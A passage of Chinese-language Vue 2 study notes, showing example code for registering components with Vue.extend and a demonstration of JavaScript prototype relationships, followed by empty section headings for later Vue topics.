               <div>
                   <h2>学校名称：{{schoolName}}</h2>
                   <h2>学校地址：{{schoolAddress}}</h2>
               </div>
       `,
       data() {
           return {
               schoolName: '深圳大学',
               schoolAddress: '广东省深圳市'
           }
       },

   })

 console.log('@',school);

 const  hello = Vue.extend({
     template:`
               <div>
                   <h2>{{name}}</h2>
               </div>
       `,
     data() {
         return {
             name: 'Hello',
         }
     }
 })
 console.log('@',hello);

 const vm = new Vue({
        el: '#root',
        //第二步：注册组件
        components:{
            school:school,
            hello:hello
        }


    });



</script>
</html>
```

![image-20240807162046004](upload\image-20240807162046004.png)

![image-20240807162108741](upload\image-20240807162108741.png)

### 一个重要内置关系

![image-20240807165857615](upload\image-20240807165857615.png)

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>一个重要内置关系</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>


<body>
    <div id="root">
    </div>



</body>

<script type="text/javascript">
 Vue.config.productionTip = false

// 定义一个构造函数
 function Demo(){
     this.a = 1
     this.b = 2
 }

 // 创建一个Demo实例对象
 const d = new Demo()


 console.log(Demo.prototype) // 显示原型属性
 console.log(d.__proto__)// 隐式原型属性

 // 程序员通过显示原型属性操作原型对象，追加一个x属性，值为99
 Demo.prototype.x = 99

 const vm = new Vue({
        el: '#root',

    });
 console.log(Demo.prototype === d.__proto__)

 console.log('@',d.__proto__.x)
 console.log(d)


 function Person(){
 }
 function Dog(){
 }
 const  p = new Person()
 const  d2 = new Dog()
 console.log(p)
 console.log(d2)

</script>
</html>
```

![image-20240807170032470](upload\image-20240807170032470.png)





## Vue-cli



## Vue-router



## Vuex



## element-ui



## vue3